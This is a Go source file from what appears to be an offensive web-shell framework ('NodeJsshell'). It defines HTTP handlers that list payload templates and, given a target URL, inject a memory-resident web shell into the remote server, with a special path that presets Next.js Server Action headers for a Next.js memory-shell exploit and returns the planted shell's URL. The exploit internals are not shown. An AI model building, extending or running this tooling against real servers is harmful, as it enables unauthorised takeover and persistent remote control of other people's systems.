package handlers

import (
	"NodeJsshell/core/exploit"
	"NodeJsshell/core/payload"
	"github.com/gin-gonic/gin"
	"net/http"
)

type PayloadHandler struct {
}

func NewPayloadHandler() *PayloadHandler {
	return &PayloadHandler{}
}

func (h *PayloadHandler) GetTemplates(c *gin.Context) {
	templates := payload.GetTemplates()
	c.JSON(http.StatusOK, templates)
}

func (h *PayloadHandler) Inject(c *gin.Context) {
	var req struct {
		URL          string            `json:"url" binding:"required"`
		Password     string            `json:"password"`
		EncodeType   string            `json:"encode_type"`
		TemplateName string            `json:"template_name"`
		ShellPath    string            `json:"shell_path"`
		Headers      map[string]string `json:"headers"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TemplateName == "" && req.ShellPath != "" {
		headers := req.Headers
		if headers == nil {
			headers = make(map[string]string)
		}
		if headers["Next-Action"] == "" {
			headers["Next-Action"] = "x"
		}
		if headers["X-Nextjs-Request-Id"] == "" {
			headers["X-Nextjs-Request-Id"] = "b5dce965"
		}
		if headers["X-Nextjs-Html-Request-Id"] == "" {
			headers["X-Nextjs-Html-Request-Id"] = "SSTMXm7OJ_g0Ncx6jpQt9"
		}
		err := exploit.InjectNextJSMemoryShell(req.URL, req.ShellPath, headers)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, gin.H{
			"success":   true,
			"message":   "Next.js memory shell injected successfully",
			"shell_url": req.URL + req.ShellPath,
		})
		return
	}
	if req.EncodeType == "" {
		req.EncodeType = "base64"
	}
	err := exploit.InjectMemoryShell(req.URL, req.Password, req.EncodeType, req.TemplateName)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"message": "Memory shell injected successfully",
	})
}



